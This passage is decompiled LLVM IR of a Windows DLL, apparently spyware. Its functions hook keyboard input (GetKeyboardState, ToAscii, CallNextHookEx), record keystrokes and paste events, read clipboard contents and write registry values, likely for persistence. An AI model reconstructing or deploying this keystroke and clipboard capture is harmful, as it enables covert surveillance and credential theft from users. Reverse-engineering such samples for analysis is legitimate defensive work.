  %67 = trunc i32 %66 to i8, !insn.addr !534
  %68 = add i8 %65, %67, !insn.addr !534
  store i8 %68, i8* %64, align 1, !insn.addr !534
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !534
  br label %dec_label_pc_404e37, !insn.addr !534

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !535
  %70 = inttoptr i32 %69 to i32*, !insn.addr !535
  store i32 0, i32* %70, align 4, !insn.addr !535
  %71 = add i32 %esp.0, -8, !insn.addr !536
  %72 = inttoptr i32 %71 to i32*, !insn.addr !536
  store i32 0, i32* %72, align 4, !insn.addr !536
  %73 = add i32 %esp.0, -12, !insn.addr !537
  %74 = inttoptr i32 %73 to i32*, !insn.addr !537
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !537
  %75 = add i32 %esp.0, -16, !insn.addr !538
  %76 = inttoptr i32 %75 to i32*, !insn.addr !538
  store i32 -2147483647, i32* %76, align 4, !insn.addr !538
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !539
  %78 = call i32 @function_4034c8(), !insn.addr !540
  %79 = add i32 %78, 1, !insn.addr !541
  %80 = add i32 %esp.0, -20, !insn.addr !542
  %81 = inttoptr i32 %80 to i32*, !insn.addr !542
  store i32 %79, i32* %81, align 4, !insn.addr !542
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !543
  br label %dec_label_pc_404e57, !insn.addr !543

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !544
  %83 = add i32 %esp.1.reload, -4, !insn.addr !545
  %84 = inttoptr i32 %83 to i32*, !insn.addr !545
  store i32 %82, i32* %84, align 4, !insn.addr !545
  %85 = add i32 %esp.1.reload, -8, !insn.addr !546
  %86 = inttoptr i32 %85 to i32*, !insn.addr !546
  store i32 1, i32* %86, align 4, !insn.addr !546
  %87 = add i32 %esp.1.reload, -12, !insn.addr !547
  %88 = inttoptr i32 %87 to i32*, !insn.addr !547
  store i32 0, i32* %88, align 4, !insn.addr !547
  %89 = add i32 %esp.1.reload, -16, !insn.addr !548
  %90 = inttoptr i32 %89 to i32*, !insn.addr !548
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !548
  %91 = add i32 %arg6, -8, !insn.addr !549
  %92 = inttoptr i32 %91 to i32*, !insn.addr !549
  %93 = load i32, i32* %92, align 4, !insn.addr !549
  %94 = add i32 %esp.1.reload, -20, !insn.addr !550
  %95 = inttoptr i32 %94 to i32*, !insn.addr !550
  store i32 %93, i32* %95, align 4, !insn.addr !550
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !551
  %97 = load i32, i32* %92, align 4, !insn.addr !552
  %98 = add i32 %esp.1.reload, -24, !insn.addr !553
  %99 = inttoptr i32 %98 to i32*, !insn.addr !553
  store i32 %97, i32* %99, align 4, !insn.addr !553
  %100 = call i32 @function_404374(), !insn.addr !554
  %101 = load i32, i32* %99, align 4, !insn.addr !555
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !556
  store i32 4214421, i32* %90, align 4, !insn.addr !557
  %102 = call i32 @"@LStrClr"(), !insn.addr !558
  ret i32 %102, !insn.addr !559
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !560
  ret i32 %0, !insn.addr !560
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !561
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !562
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !563
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !563
  %5 = inttoptr i32 %2 to i8*, !insn.addr !563
  store i8 %4, i8* %5, align 1, !insn.addr !563
  %6 = add i32 %0, 111, !insn.addr !564
  %7 = inttoptr i32 %6 to i8*, !insn.addr !564
  %8 = load i8, i8* %7, align 1, !insn.addr !564
  %9 = trunc i32 %1 to i8, !insn.addr !564
  %10 = add i8 %8, %9, !insn.addr !564
  %11 = icmp eq i8 %10, 0, !insn.addr !564
  store i8 %10, i8* %7, align 1, !insn.addr !564
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !565

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !565
  br label %dec_label_pc_404ea1, !insn.addr !565

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !564
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !566

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !510, !insn.addr !564
  %16 = and i8 %15, 1, !insn.addr !564
  %17 = icmp eq i8 %16, 0, !insn.addr !564
  %18 = trunc i32 %arg4 to i16, !insn.addr !567
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !567
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !567
  store i32 %19, i32* %20, align 4, !insn.addr !567
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !568

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !569
  %22 = icmp eq i32 %21, 0, !insn.addr !569
  store i32 %arg2, i32* %.reg2mem, !insn.addr !570
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !570

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !571
  %24 = trunc i32 %21 to i16, !insn.addr !572
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !572
  %26 = load i32, i32* %25, align 4, !insn.addr !572
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !572
  %27 = load i32, i32* %25, align 4, !insn.addr !573
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !573
  %28 = add i32 %arg7, 105, !insn.addr !574
  %29 = inttoptr i32 %28 to i8*, !insn.addr !574
  %30 = load i8, i8* %29, align 1, !insn.addr !574
  %31 = trunc i32 %23 to i8, !insn.addr !574
  %32 = add i8 %30, %31, !insn.addr !574
  %33 = icmp eq i8 %32, 0, !insn.addr !574
  store i8 %32, i8* %29, align 1, !insn.addr !574
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !575

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !576
  %34 = inttoptr i32 %23 to i8*, !insn.addr !577
  %35 = load i8, i8* %34, align 1, !insn.addr !577
  %36 = add i8 %35, %31, !insn.addr !577
  store i8 %36, i8* %34, align 1, !insn.addr !577
  %37 = add i32 %arg5, 86, !insn.addr !578
  %38 = inttoptr i32 %37 to i8*, !insn.addr !578
  %39 = load i8, i8* %38, align 1, !insn.addr !578
  %40 = trunc i32 %21 to i8, !insn.addr !578
  %41 = add i8 %39, %40, !insn.addr !578
  store i8 %41, i8* %38, align 1, !insn.addr !578
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !579
  %42 = call i32 @"@LStrClr"(), !insn.addr !580
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !581
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !582
  %44 = zext i1 %43 to i32, !insn.addr !583
  ret i32 %44, !insn.addr !583

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !584
  %46 = inttoptr i32 %45 to i8*, !insn.addr !584
  %47 = load i8, i8* %46, align 2, !insn.addr !584
  %48 = mul i8 %47, 2, !insn.addr !584
  store i8 %48, i8* %46, align 2, !insn.addr !584
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !585
  %50 = icmp eq i32* %49, null, !insn.addr !586
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !587

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !585
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !588
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !589
  %53 = icmp eq i32* %52, null, !insn.addr !590
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !591

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !592
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !593
  br label %dec_label_pc_404f04, !insn.addr !593

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !594
  br label %dec_label_pc_404f09, !insn.addr !594

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !595
  %57 = sext i1 %56 to i32, !insn.addr !595
  store i32 %57, i32* %.reg2mem, !insn.addr !596
  br label %dec_label_pc_404f0f, !insn.addr !596

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !597
  ret i32 %.reload, !insn.addr !597
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !598
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !598
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !599
  %4 = inttoptr i32 %3 to i32*, !insn.addr !600
  %5 = load i32, i32* %4, align 4, !insn.addr !600
  %6 = icmp eq i32 %5, 0, !insn.addr !600
  %7 = icmp eq i1 %6, false, !insn.addr !601
  %8 = icmp eq i1 %7, false, !insn.addr !602
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !602

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !603
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !604
  %11 = icmp eq i32* %10, null, !insn.addr !605
  %12 = icmp eq i1 %11, false, !insn.addr !606
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !606

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !607
  br label %dec_label_pc_404f50, !insn.addr !607

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !608
  store i32 0, i32* %15, align 4, !insn.addr !608
  ret i32 -2147221231, !insn.addr !609
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !610
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !611
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !612
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !613
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !613
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !613
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !614
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !615
  %3 = add i32 %2, 1, !insn.addr !615
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !615
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !616
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !617
  ret i32 0, !insn.addr !618
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !619
  ret i32 %0, !insn.addr !619
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !620
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !621
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !622
  %2 = add i32 %1, -1, !insn.addr !622
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !622
  ret i32 %0, !insn.addr !623
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !624
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !625
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !625
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !625
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !626
  %4 = call i32 @function_407250(), !insn.addr !627
  %5 = icmp ne i32 %4, 0, !insn.addr !628
  %6 = icmp eq i1 %5, false, !insn.addr !629
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !630
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !630

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !631
  %8 = call i32 @"@LStrDelete"(), !insn.addr !632
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !633
  br label %dec_label_pc_4050bb, !insn.addr !633

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !634
  %10 = call i32 @"@LStrDelete"(), !insn.addr !635
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !636
  br label %dec_label_pc_4050bb, !insn.addr !636

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !637
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !638
  %14 = udiv i32 %1, 65536, !insn.addr !639
  %15 = and i32 %14, 255, !insn.addr !640
  %16 = inttoptr i32 %15 to i16*, !insn.addr !641
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !642
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !643
  %19 = icmp eq i32 %18, 1, !insn.addr !644
  %20 = icmp eq i1 %19, false, !insn.addr !645
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !645
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !645

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !646
  %22 = icmp eq i32 %21, 0, !insn.addr !647
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !648
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !648

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !649
  %24 = icmp sgt i32 %23, 15, !insn.addr !650
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !650
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !650

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !651
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !652
  %27 = call i32 @"@LStrInsert"(), !insn.addr !653
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !653
  br label %dec_label_pc_4050bb, !insn.addr !653

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !654
  %29 = load i32, i32* %28, align 4, !insn.addr !654
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !655
  %30 = add i32 %esp.0.reload, 8, !insn.addr !656
  %31 = inttoptr i32 %30 to i32*, !insn.addr !656
  store i32 4215003, i32* %31, align 4, !insn.addr !656
  %32 = call i32 @"@LStrClr"(), !insn.addr !657
  ret i32 %32, !insn.addr !658
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !659
  ret i32 %0, !insn.addr !659
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !661
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !662
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !662
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !662
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !663
  %2 = call i32 @function_407250(), !insn.addr !664
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !665
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !666
  %4 = add i32 %1, 8, !insn.addr !667
  %5 = inttoptr i32 %4 to i32*, !insn.addr !667
  store i32 4215210, i32* %5, align 4, !insn.addr !667
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !668
  ret i32 %6, !insn.addr !669
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !670
  ret i32 %0, !insn.addr !670
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !671
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !672
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !673
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !674
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !674
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !674
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !675
  %3 = call i32 @function_4071c0(), !insn.addr !676
  %4 = icmp eq i32 %3, 0, !insn.addr !677
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !678
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !678

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !679
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !680
  %7 = ptrtoint i32* %6 to i32, !insn.addr !680
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !681
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !681
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !682
  %10 = icmp eq i1 %9, false, !insn.addr !683
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !684

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !685
  %12 = call i32 @"@LStrAsg"(), !insn.addr !686
  %13 = call i32 @function_407348(), !insn.addr !687
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !688
  br label %dec_label_pc_405214, !insn.addr !688

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !689
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !689
  br label %dec_label_pc_405214, !insn.addr !689

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !690
  %16 = load i32, i32* %15, align 4, !insn.addr !690
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !691
  %17 = add i32 %esp.0.reload, 8, !insn.addr !692
  %18 = inttoptr i32 %17 to i32*, !insn.addr !692
  store i32 4215345, i32* %18, align 4, !insn.addr !692
  %19 = call i32 @"@LStrClr"(), !insn.addr !693
  ret i32 %19, !insn.addr !694
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !695
  ret i32 %0, !insn.addr !695
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !696
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !697
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !698
  %8 = inttoptr i32 %4 to i8*, !insn.addr !698
  store i8 %7, i8* %8, align 1, !insn.addr !698
  %9 = add i32 %2, 111, !insn.addr !699
  %10 = inttoptr i32 %9 to i8*, !insn.addr !699
  %11 = load i8, i8* %10, align 1, !insn.addr !699
  %12 = load i32, i32* %eax, align 4, !insn.addr !699
  %13 = trunc i32 %12 to i8, !insn.addr !699
  %14 = add i8 %11, %13, !insn.addr !699
  store i8 %14, i8* %10, align 1, !insn.addr !699
  %15 = trunc i32 %3 to i16, !insn.addr !700
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !700
  %17 = inttoptr i32 %0 to i32*, !insn.addr !700
  store i32 %16, i32* %17, align 4, !insn.addr !700
  %18 = add i32 %0, 66, !insn.addr !701
  %19 = inttoptr i32 %18 to i64*, !insn.addr !701
  %20 = load i64, i64* %19, align 4, !insn.addr !701
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !701
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !702
  %22 = load i8, i8* %5, align 4, !insn.addr !703
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !703
  %25 = add i8 %22, %24, !insn.addr !703
  %26 = inttoptr i32 %23 to i8*, !insn.addr !703
  store i8 %25, i8* %26, align 1, !insn.addr !703
  %27 = add i32 %21, -117, !insn.addr !704
  %28 = inttoptr i32 %27 to i8*, !insn.addr !704
  %29 = load i8, i8* %28, align 1, !insn.addr !704
  %30 = trunc i32 %3 to i8, !insn.addr !704
  %31 = add i8 %29, %30, !insn.addr !704
  store i8 %31, i8* %28, align 1, !insn.addr !704
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !705
  %33 = add i32 %21, 16, !insn.addr !706
  %34 = inttoptr i32 %33 to i32*, !insn.addr !706
  %35 = load i32, i32* %34, align 4, !insn.addr !706
  %36 = add i32 %21, 12, !insn.addr !707
  %37 = inttoptr i32 %36 to i32*, !insn.addr !707
  %38 = load i32, i32* %37, align 4, !insn.addr !707
  %39 = add i32 %21, 8, !insn.addr !708
  %40 = inttoptr i32 %39 to i32*, !insn.addr !708
  %41 = load i32, i32* %40, align 4, !insn.addr !708
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !709
  %43 = inttoptr i32 %42 to i32*, !insn.addr !710
  %44 = load i32, i32* %43, align 4, !insn.addr !710
  %45 = icmp eq i32 %44, 0, !insn.addr !710
  %46 = icmp eq i1 %45, false, !insn.addr !711
  %47 = icmp eq i32 %41, 0, !insn.addr !712
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !713
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !714

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !715
  %51 = add i32 %35, 4, !insn.addr !716
  %52 = inttoptr i32 %51 to i32*, !insn.addr !716
  %53 = load i32, i32* %52, align 4, !insn.addr !716
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !717
  br label %dec_label_pc_40529a, !insn.addr !718

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !719
  br label %dec_label_pc_40529a, !insn.addr !719

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !720
  %57 = inttoptr i32 %35 to i32*, !insn.addr !721
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !721
  ret i32 %58, !insn.addr !722
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !723
  %5 = icmp eq i1 %4, false, !insn.addr !724
  %6 = icmp eq i32 %arg3, 0, !insn.addr !725
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !726

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !727
  %9 = inttoptr i32 %8 to i32*, !insn.addr !727
